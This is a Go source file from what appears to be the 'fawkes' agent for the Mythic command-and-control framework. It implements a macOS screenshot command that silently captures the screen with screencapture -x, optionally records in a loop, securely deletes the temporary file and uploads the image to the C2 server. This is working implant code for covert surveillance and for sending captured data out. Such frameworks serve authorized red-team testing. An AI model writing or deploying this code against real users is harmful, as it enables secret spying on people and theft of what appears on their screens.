//go:build darwin

package commands

import (
	"fmt"
	"os"
	"time"

	"fawkes/pkg/structs"
)

// ScreenshotDarwinCommand implements screenshot for macOS using screencapture CLI
type ScreenshotDarwinCommand struct{}

func (c *ScreenshotDarwinCommand) Name() string {
	return "screenshot"
}

func (c *ScreenshotDarwinCommand) Description() string {
	return "Capture a screenshot of the desktop (macOS screencapture)"
}

func (c *ScreenshotDarwinCommand) Execute(task structs.Task) structs.CommandResult {
	params := parseScreenshotParams(task)

	if params.Action == "record" {
		return screenshotRecordLoop(task, captureScreenDarwin, params)
	}

	// Single screenshot
	imgData, err := captureScreenDarwin()
	if err != nil {
		return errorf("Error: %v", err)
	}

	// Send screenshot to Mythic
	screenshotMsg := structs.SendFileToMythicStruct{}
	screenshotMsg.Task = &task
	screenshotMsg.IsScreenshot = true
	screenshotMsg.SendUserStatusUpdates = false
	screenshotMsg.Data = &imgData
	screenshotMsg.FileName = fmt.Sprintf("screenshot_%d.png", time.Now().Unix())
	screenshotMsg.FullPath = ""
	screenshotMsg.FinishedTransfer = make(chan int, 2)

	task.Job.SendFileToMythic <- screenshotMsg

	// Wait for transfer to complete
	for {
		select {
		case <-screenshotMsg.FinishedTransfer:
			return successf("Screenshot captured and uploaded (%d bytes)", len(imgData))
		case <-time.After(1 * time.Second):
			if task.DidStop() {
				return errorResult("Screenshot upload cancelled")
			}
		}
	}
}

// captureScreenDarwin captures a screenshot using macOS screencapture CLI.
func captureScreenDarwin() ([]byte, error) {
	tf, tfErr := os.CreateTemp("", "")
	if tfErr != nil {
		return nil, fmt.Errorf("creating temp file: %v", tfErr)
	}
	tmpFile := tf.Name()
	tf.Close()

	if output, err := execCmdTimeout("screencapture", "-x", "-t", "png", tmpFile); err != nil {
		secureRemove(tmpFile)
		return nil, fmt.Errorf("screencapture failed: %v\n%s", err, string(output))
	}

	imgData, err := os.ReadFile(tmpFile)
	secureRemove(tmpFile)
	if err != nil {
		return nil, fmt.Errorf("reading screenshot file: %v", err)
	}

	if len(imgData) == 0 {
		return nil, fmt.Errorf("screenshot captured but file was empty")
	}

	return imgData, nil
}
